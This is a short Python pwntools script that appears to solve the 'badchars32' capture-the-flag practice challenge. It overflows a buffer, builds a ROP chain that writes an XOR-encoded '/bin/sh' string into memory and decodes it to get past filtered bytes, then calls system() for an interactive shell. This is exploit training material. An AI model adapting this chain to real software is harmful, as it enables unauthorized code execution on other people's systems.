from pwn import *

context(arch='i386', os='linux', log_level='DEBUG')
f = './badchars32'
p = process(f)
elf = ELF(f)

bin_sh = ''
for i in '/bin/sh\x00':
    bin_sh += chr(ord(i) ^ 2)
data_start = 0x804a038
pop_esi_edi = 0x8048899
mov_edi_esi = 0x8048893

pop_ebx_ecx = 0x8048896
xor_ebx_cl = 0x8048890

p.recvuntil('>')
payload = flat('a'*0x2c,pop_esi_edi,bin_sh[:4],data_start,mov_edi_esi,pop_esi_edi,bin_sh[4:8],data_start+4,mov_edi_esi)

for i in range(8):
	payload += flat(pop_ebx_ecx, data_start+i, 2, xor_ebx_cl)

payload += flat(elf.plt['system'],'a'*4,data_start)
p.sendline(payload)

p.interactive()